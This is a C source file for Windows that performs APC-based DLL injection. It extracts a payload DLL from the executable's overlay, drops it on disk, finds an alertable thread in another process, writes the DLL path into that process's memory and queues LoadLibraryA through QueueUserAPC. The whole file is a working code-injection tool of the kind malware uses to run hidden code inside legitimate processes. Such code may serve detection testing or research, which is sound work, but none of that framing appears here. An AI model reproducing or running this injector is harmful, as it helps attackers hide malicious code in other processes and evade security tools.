#include <windows.h>
#include <TlHelp32.h> 
#include <string.h>
#include <stdio.h>
#include "..\..\Shared\payload.c"
#include "..\..\Shared\overlay.c"
#include "..\..\Shared\findThreads.c"


typedef void* HANDLE;

int apcDllInjection(){
    LPVOID loadLibraryAddress = NULL;
    HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32.dll"));
    if (hKernel32 != 0){
        loadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
    }
    if (loadLibraryAddress == NULL){
        perror("DLL injection failed. Could not found LoadLibrary function.\n");
        exit(EXIT_FAILURE);
    }

    struct Handles handles;
    getRemoteThreadHandles(&handles);
    if (handles.itemsCount == 0 ){
        perror("DLL injection failed. Could not get remote thread handles.\n");
        exit(EXIT_FAILURE);
    }
    
    int pid = 0;
    int index = findAlertableThread(hKernel32, &handles);
    if (index == -1){
        perror("DLL injection failed. Could not find alertable thread.\n");
        exit(EXIT_FAILURE);
    }
    HANDLE hAlertableThread = handles.threadHandlesArray[index];
    pid = handles.processPidsArray[index];

    //get overlay data
    struct Overlay overlay;
    overlay.overlayData = NULL;
    overlay.overlaySize = 0;
    getOverlay(&overlay);
    if(overlay.overlayData == NULL || overlay.overlaySize == 0){
        perror("Injection failed. Could not get overlay data.\n");
        exit(EXIT_FAILURE);
    }

    //write file from overlay on disk
    struct Payload payload;
    payload.payloadSize = overlay.overlaySize;
    payload.payloadData = overlay.overlayData;
    char *dllPath = (char *)dropPayloadOnDisk("apcDllinjection.dll", payload);
    if (dllPath == 0){
        perror("Injection failed. DLL could not be created.\n");
        exit(EXIT_FAILURE);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
        perror("DLL injection failed. Process could not be opened.\n");
        exit(EXIT_FAILURE);
    }
    
    int dllPathSize = strlen(dllPath);
    int *allocAddress;
    allocAddress = VirtualAllocEx(hProcess, NULL, dllPathSize + 1, MEM_COMMIT, PAGE_READWRITE);
    if(allocAddress == NULL){
        perror("DLL injection failed. Could not allocate memory in remote process.\n");
        exit(EXIT_FAILURE);
    }

    if (WriteProcessMemory(hProcess, allocAddress, dllPath, dllPathSize, NULL) == 0){
        perror("DLL injection failed. Could not write to remote process.\n");
        exit(EXIT_FAILURE);
    }

    if(QueueUserAPC(loadLibraryAddress, hAlertableThread, (ULONG_PTR)allocAddress) == 0){
        perror("DLL injection failed. Could not create APC.\n");
        exit(EXIT_FAILURE);
    }

    CloseHandle(hProcess);
    puts("Injection successfull.");
    return 0;
}


int main(int argc, char *argv[]){
    apcDllInjection();
    return 0;
}
